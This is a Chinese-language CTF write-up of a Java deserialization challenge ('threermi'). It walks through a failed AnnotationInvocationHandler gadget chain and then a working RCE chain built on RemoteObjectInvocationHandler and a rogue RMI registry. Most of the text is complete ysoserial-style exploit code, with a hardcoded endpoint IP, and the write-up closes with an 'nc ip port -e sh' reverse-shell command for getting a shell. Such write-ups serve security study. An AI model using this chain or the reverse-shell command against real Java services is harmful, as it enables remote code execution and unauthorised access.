exp代码如下
    package ysoserial.payloads;
    import com.ctf.threermi.*;
    import org.springframework.beans.factory.ObjectFactory;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.JavaVersion;
    import ysoserial.payloads.util.PayloadRunner;
    import ysoserial.payloads.util.Reflections;
    import javax.xml.transform.Templates;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Type;
    import static java.lang.Class.forName;
    public class TCTF3rmi extends PayloadRunner implements ObjectPayload {
        public Object getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            final FactoryInter factoryInter = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), FactoryInter.class);
            final MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
            Reflections.setFieldValue(myInvocationHandler,"object",factoryInter);
            final Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class,Templates.class);
            final UserInter userInter = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getGirlFriend", friend),
                UserInter.class,Templates.class);
            Gadget gadget = new Gadget();
            Reflections.setFieldValue(gadget,"user",userInter);
            Reflections.setFieldValue(gadget,"mName","newTransformer");
            return gadget;
        }
        public static void main(final String[] args) throws Exception {
            PayloadRunner.run(TCTF3rmi.class, args);
        }
        public static boolean isApplicableJavaVersion() {
            return JavaVersion.isAnnInvHUniversalMethodImpl();
        }
    }
但最终是无法打通题目，可以问题出在看到从`memberValues`中获取到的对象是null。
原因在于在最开始已经说到spring1的链子有jdk版本限制，而题目的版本是jdk8u201，高版本下`AnnotationInvocationHandler`的readObject方法被修改了，无法控制this.memberValues的值了，所以也无法控制invoke的返回对象。下面看看到底在哪被限制了呢。
jdk8u201版本下的`AnnotationInvocationHandler`如下,最终需要满足判断`var12 !=
null`才能获取HashMap中的键值然后put到var7中最后赋值给`MemberValues`
而`memberTypes`是从`AnnotationType`实例化后的对象获取到的，跟进`getInstance`。可以看到第一个参数指定var1必须是Annotation的子类，第二个参数是传入一个Map类型的var2。将var1赋值给成员变量type然后将var赋值给成员变量memberValues。
这里的分析其实就是CC1链子的分析网上也有很多文章，接着看到`AnonotationType`的构造函数。可以看到`memberTypes`的赋值是在构造函数中实现的。构造函数传的参数是AnnotationInvocationHandler的var0，然后通过反射获取了Annotation对象的所有方法，遍历方法名字赋值给var7，方法返回类型赋值给var8，最后将两者put到memberTypes成员变量中。
所以回到readObject，要进入if里面就需要在HashMap里面put一个Annotation对象的方法名字，这里的Retention为Annotation的一个子类且有一个value的方法。
所以这样的话就只需要往HashMap中put一个键名是"value"的字符串就能进入到if中了。
但是问题又来了，我们能够看到此时var4中存在两个map了，一个map中含有value键名，但另一个还是没有，所以当遍历到键名为getObject的map时还是无法进入到if中就无法获取到map的键值，那最终`MemberValues`的这个map的键值就是null，所以就会出现在`AnnotationInvocationHandler.invoke()`函数中从MemberValues获取对象结果为null的问题了。
而要解决这个问题就是找到一个Annotation的一个子类，这个子类的所有方法名中有叫`getObject`的方法。但显然这样的类无法找到。所以还是需要舍弃这个类去寻找新的类了。
#### RemoteObjectInvocationHandler
这个类的寻找也很简单官方wp上直接使用java代码遍历类设置条件筛选出可用的类或者直接使用codeql也很方便
    public class FindClass {
        public static void main(String[] args) {
            Reflections reflections = new Reflections();
            Set> subTypesOf =
                    reflections.getSubTypesOf(InvocationHandler.class);
            for (Class aClass : subTypesOf) {
                if(Serializable.class.isAssignableFrom(aClass)){
                    System.out.println(
                            aClass
                    );
                }
            }
        }
    }
    import java
    from Class c 
    where c.getASupertype().hasName("InvocationHandler")
        and
        c.getASupertype*() instanceof TypeSerializable
    select c
`RemoteObjectInvocationHandler`的invoke方法如下，可以看到这个类最终能调用到ref的invoke方法。  
ref.invoke最终调用到的是StreamRemoteCall#executeCall方法。基本上所有客户端的请求，invoke->executeCall其实就是一条危险片段链，是rmi攻击手段中经常会见到的类。
ref其实就是一个远程引用，里面保存着服务端的对象信息。就像我们调用Registry的bind方法时，绑定的也是远程引用。
但是这里还是无法控制返回对象所以还是不能直接替换AnnotationInvocationHandler这个类，但是又有另外一个攻击思路了。
  * 首先我们自己实现两个接口然后绑定到注册中心，这样ref中保存的就是我们的自己实现接口后的类。
  * 然后利用RemoteObjectInvocationHandler来代理UserInter接口让题目客户端反序列化时调用的方法是我们自己实现的方法，这样我们在自己实现的类里就能控制返回对象了。
例如这样，只需要让题目客户端调用到我们自己实现的类即能控制返回对象。
## 最终攻击-rce反序列化链
最终的链子如下。
    package ysoserial.payloads;
    import com.ctf.threermi.*;
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.PayloadRunner;
    import ysoserial.payloads.util.Reflections;
    import javax.xml.transform.Templates;
    import java.lang.reflect.Array;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.rmi.server.RemoteRef;
    import java.rmi.server.UnicastRemoteObject;
    /*
    /*
        Gadget chain:
            Gadget.readObject()
                UserInter(Proxy).getGirlFriend()
                    RemoteObjectInvocationHandler.invoke()
                        UnicastRef.invoke()
                            StreamRemoteCall#executeCall()
                                UserInter.getGirlFriend()
                            Templates(Proxy).newTransformer()
                         MyInvocationHandler.invoke()
                            FactoryInter(Proxy).getObject()
                                RemoteObjectInvocationHandler.invoke()
                                    UnicastRef.invoke()
                                        StreamRemoteCall#executeCall()
                                            FactoryInter.getObject()
                 Method.invoke()
                                TemplatesImpl.newTransformer()
                                    TemplatesImpl.getTransletInstance()
                                        TemplatesImpl.defineTransletClasses()
                                            TemplatesImpl.TransletClassLoader.defineClass()
                                                Pwner*(Javassist-generated).
                                                    Runtime.exec()
     */
     */
    class UserImpl implements UserInter {
        Registry registry;
        {
            try {
                registry = LocateRegistry.getRegistry(7777);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }
        @Override
        public String sayHello(String paramString) throws RemoteException {
            return null;
        }
        @Override
        public Friend getGirlFriend() throws RemoteException {
            FactoryInter factoryInter = null;//annotationInvocationHandler
            try {
                final Class[] allIfaces = (Class[]) Array.newInstance(Class.class, 2);
                allIfaces[0] = FactoryInter.class;
                allIfaces[1] = Remote.class;
                factoryInter = (FactoryInter) Proxy.newProxyInstance(FactoryInter.class.getClassLoader(),allIfaces,Proxy.getInvocationHandler(registry.lookup("factory")));
            } catch (Exception e) {
                e.printStackTrace();
            }
            final MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
            try {
                Reflections.setFieldValue(myInvocationHandler,"object",factoryInter);
            } catch (Exception e) {
                e.printStackTrace();
            }
            final Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class, Templates.class);
            return friend;
        }
    }
    class FactoryImpl implements FactoryInter{
        String cmd;
        @Override
        public Object getObject() throws Exception {
            return Gadgets.createTemplatesImpl(this.cmd);
        }
    }
    public class TCTF3rmiExp extends PayloadRunner implements ObjectPayload {
        public Object getObject(final String command) throws Exception {
            int evilServerPort = 7777;
            Registry registry = LocateRegistry.createRegistry(evilServerPort);
            UserImpl user1 = new UserImpl();
            registry.bind("UserImpl", UnicastRemoteObject.exportObject(user1, evilServerPort));
            FactoryImpl factoryImpl = new FactoryImpl();
            Reflections.setFieldValue(factoryImpl,"cmd",command);
            registry.bind("factory", UnicastRemoteObject.exportObject(factoryImpl, evilServerPort));
    //        ((UnicastRef) ((RemoteObjectInvocationHandler) ref).ref).getLiveRef().getEndpoint().getClass()
            InvocationHandler ref = Proxy.getInvocationHandler(registry.lookup("UserImpl"));
            Field field =  ref.getClass().getSuperclass().getDeclaredField("ref");
            field.setAccessible(true);
            UnicastRef unicastRef =  (UnicastRef)field.get(ref);
            LiveRef liveRef = (LiveRef) Reflections.getFieldValue(unicastRef,"ref");
            TCPEndpoint tcpEndpoint = (TCPEndpoint)Reflections.getFieldValue(liveRef,"ep");
            Reflections.setFieldValue(tcpEndpoint,"host","10.122.207.125");
            RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler((RemoteRef) Reflections.getFieldValue(ref,"ref"));
            final UserInter user = (UserInter) Proxy.newProxyInstance(UserInter.class.getClassLoader(),new Class[]{UserInter.class,Remote.class},remoteObjectInvocationHandler);
            Gadget gadget = new Gadget();
            Reflections.setFieldValue(gadget,"user",user);
            Reflections.setFieldValue(gadget,"mName","newTransformer");
            return gadget;
        }
        public static void main(String[] args) throws Exception {
            PayloadRunner.run(TCTF3rmiExp.class, args);
        }
    }
整体调试一下链子还是很顺利的。
进入到UnicastRef.invoke()里面首先用newCall方法首先会建立一个连接到对应的RMI服务端。后面其实就是正常客户端获取RMIRegistry对象的流程了。
StreamRemoteCall初始化会在自己的this.out属性中序列化一些属性进去
然后判断如果方法有参数，调用 marshalValue 将参数写入到输出流，然后调用
executeCall。但我们这里很明显getGirlFriend没有参数所以不进入。
在executeCall中首先会释放输出流
然后获取服务端返回数据信息
然后读取第一个字节和81进行相等比较，81是在TransportConstants中定义好的代表Return标志位。
然后又会读取一个字节。读取的第二个字节会用于下面的流程判断，如果是1的话那么直接return，而如果是2的话，那么会对返回回来的数据进行反序列化（这是一个攻击点，也就是如果服务端返回回来的序列化数据，那么在这里客户端是可以进行反序列化的），其实ysoserial的JRMPListener就是利用的这里，实际上进入到`case
2`后就是处理TransportConstants.ExceptionalReturn报错情况，所以这也是为什么会说需要将payload放到报错信息中的原因。  
这里很明显我们并没有进入到`case 2`。
跳出之后就是通过反序列化获取远程对象了
最后我们能够使用到自己实现的类来控制返回对象，返回一个使用MyInvocationHandler代理了Templates和Friend两个接口的类
然后通过findMethod就能够找到newTransformer方法。
然后第二行`this.user.getGirlFriend()`会进行上面同样的流程返回一个代理对象，然后通过反射调用这个类里面的newTransformer方法。又由于这个被MyInvocationHandler代理过所以会进入到MyInvocationHandler的invoke方法。
这里只要再控制`this.object.getObject()`为一个TemplatesImpl实例对象就能成功调用newTransformer方法从而实例恶意字节码执行命令了。  
这里控制返回对象的方法和上面`this.user.getGirlFriend()`是一摸一样的就不再跟进一遍了。
rce效果图
### 攻击效果
先绑定恶意对象
反序列化rce链子，题目docker环境没有curl和bash，但是有nc可能确实是特意给的，所以利用`nc ip port -e
sh`即可反弹shell。
最终getshell
参考文章  